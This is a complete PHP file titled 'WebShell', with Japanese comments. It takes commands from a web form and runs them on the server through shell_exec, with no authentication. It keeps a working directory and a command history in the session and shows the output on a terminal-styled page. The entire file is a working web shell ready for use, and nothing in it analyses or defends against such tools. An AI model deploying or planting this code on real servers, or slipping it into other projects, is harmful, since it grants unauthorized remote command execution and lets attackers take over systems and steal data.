<?php
session_start();

$rpath1 = [" ./", " .\\"];
$rpath2 = [" ../", " ..\\"];

if ($_POST["cmd"]) {
    $cmd = $_POST["cmd"];
    //相対パスの置き換え
    $cmd = str_replace($rpath1, " " . trim($_SESSION["path"]) . "\\", $cmd);
    $cmd = str_replace($rpath2, " " . trim($_SESSION["path"]) . "\\..\\", $cmd);
    $cmd = str_replace(":\\\\", ":\\", $cmd);
    if ($_POST["cmd"] === "session_reset") {
        //session_resetと入力することでリセットする
        $_SESSION = [];
    } elseif (preg_match("/^cd\s/i", $_POST["cmd"])) {
        //cd コマンドでカレントディレクトリを更新
        $_SESSION["history"] .= $_SESSION["path"] . "<br>>" . $_POST["cmd"] . "<br>";
        $_SESSION["path"] = shell_exec($cmd . " & @cd");
    } else {
        $_SESSION["history"] .= $_SESSION["path"] . "<br>>" . $_POST["cmd"] . "<br><pre>" . htmlspecialchars(mb_convert_encoding(shell_exec($cmd), "UTF-8"), ENT_QUOTES, "UTF-8", true) . "</pre>";
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>WebShell</title>
    <style>
        * {
            color: #00ff00;
            font-size: 15px;
            font-family: Hack, monospace;
        }

        body {
            background-color: #000000;
        }

        input {
            border: 0px;
            background-color: transparent;
            width: 95%;
        }
    </style>
</head>

<body>
    <?php
    if (empty($_SESSION["history"])) $_SESSION["history"] = "";
    if (empty($_SESSION["path"])) $_SESSION["path"] = shell_exec("@cd");
    echo $_SESSION["history"];
    echo $_SESSION["path"]
    ?>
    <form method="POST">
        <span>></span><input autofocus type="text" name="cmd">
    </form>
</body>

</html>